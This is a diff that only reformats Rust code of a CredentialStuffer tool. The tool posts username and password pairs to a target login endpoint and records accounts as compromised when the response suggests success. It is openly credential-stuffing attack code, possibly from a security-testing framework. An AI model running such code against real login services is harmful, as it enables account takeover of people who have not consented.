@@ -39,7 +39,11 @@ impl CredentialStuffer {
         Ok(Self { engine, client })
     }
 
-    pub async fn test(&self, target: &str, credentials: &[CredentialPair]) -> Result<CredentialStuffingResult> {
+    pub async fn test(
+        &self,
+        target: &str,
+        credentials: &[CredentialPair],
+    ) -> Result<CredentialStuffingResult> {
         let mut result = CredentialStuffingResult {
             target: target.to_string(),
             credentials_tested: 0,
@@ -54,13 +58,17 @@ impl CredentialStuffer {
                 break;
             }
 
-            let response = self.client
+            let response = self
+                .client
                 .post(target)
                 .header(reqwest::header::CONTENT_TYPE, "application/json")
-                .body(serde_json::json!({
-                    "username": cred.username,
-                    "password": cred.password
-                }).to_string())
+                .body(
+                    serde_json::json!({
+                        "username": cred.username,
+                        "password": cred.password
+                    })
+                    .to_string(),
+                )
                 .send()
                 .await;
 
@@ -71,7 +79,9 @@ impl CredentialStuffer {
                     let status = resp.status().as_u16();
                     let body = resp.text().await.unwrap_or_default();
 
-                    if status == 302 || (status == 200 && !body.contains("invalid") && !body.contains("error")) {
+                    if status == 302
+                        || (status == 200 && !body.contains("invalid") && !body.contains("error"))
+                    {
                         result.successful_logins += 1;
                         result.compromised_accounts.push(CompromisedAccount {
                             username: cred.username.clone(),
